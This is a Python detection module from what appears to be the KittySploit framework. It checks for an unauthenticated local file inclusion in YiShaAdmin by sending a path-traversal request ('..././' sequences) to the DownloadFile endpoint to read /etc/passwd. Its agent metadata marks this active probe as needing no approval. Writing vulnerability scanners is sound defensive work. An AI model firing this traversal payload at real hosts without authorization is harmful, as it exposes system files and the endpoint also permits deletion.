#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""yishaadmin is vulnerable to local file inclusion via the "/admin/File/DownloadFile" endpoint and allows files ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'yishaadmin - Local File Inclusion Detection',
        'description': 'yishaadmin is vulnerable to local file inclusion via the "/admin/File/DownloadFile" endpoint and allows files to be downloaded, read or deleted without any authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'lfi', 'yishaadmin', 'huntr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://huntr.dev/bounties/2acdd87a-12bd-4ce4-994b-0081eb908128/',
            'https://github.com/liukuo362573/YiShaAdmin/blob/master/YiSha.Util/YiSha.Util/FileHelper.cs#L181-L186',
        ],
    }

    def run(self):
        path = '/admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='yishaadmin - Local File Inclusion detected', path=path)
            return True
        return False

